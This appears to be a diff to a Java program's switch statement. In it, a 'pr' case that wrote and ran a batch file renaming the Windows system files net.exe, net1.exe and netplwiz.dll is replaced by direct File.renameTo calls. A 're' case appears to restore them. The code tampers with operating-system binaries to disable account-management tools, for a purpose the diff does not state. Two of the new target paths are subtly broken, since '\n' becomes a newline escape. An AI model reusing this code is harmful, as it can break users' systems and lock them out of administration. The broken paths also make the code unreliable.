@@ -40,19 +40,9 @@ public class Run implements IWriter{
           }
           break;
         case 1: // pr
-          writeText("C:\\t.cmd", "ren %systemroot%\\net.exe n1.exe");
-          writeBR("C:\\t.cmd");
-          writeText("C:\\t.cmd", "ren %systemroot%\\net1.exe n2.exe");
-          writeBR("C:\\t.cmd");
-          writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dll netplwiz.dl3");
-          writeBR("C:\\t.cmd");
-          try{
-            Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe /c " + "C:\\t.cmd");
-          }
-          catch(IOException ioe){
-            System.err.println("Oh, no! A error was occurred! [pr, IOException]");
-            System.exit(1);
-          }
+          new File(sysPath + "\\System32\\net.exe").renameTo(new File(sysPath + "\\System32\n1.exe"));
+          new File(sysPath + "\\System32\\net1.exe").renameTo(new File(sysPath + "\\System32\n2.exe"));
+          new File(sysPath + "\\System32\\netplwiz.dll").renameTo(new File(sysPath + "\\System32\\netplwiz.dl3"));
           break;
         case 2: // re
           writeText("C:\\t.cmd", "ren %systemroot%\\n1.exe net.exe");
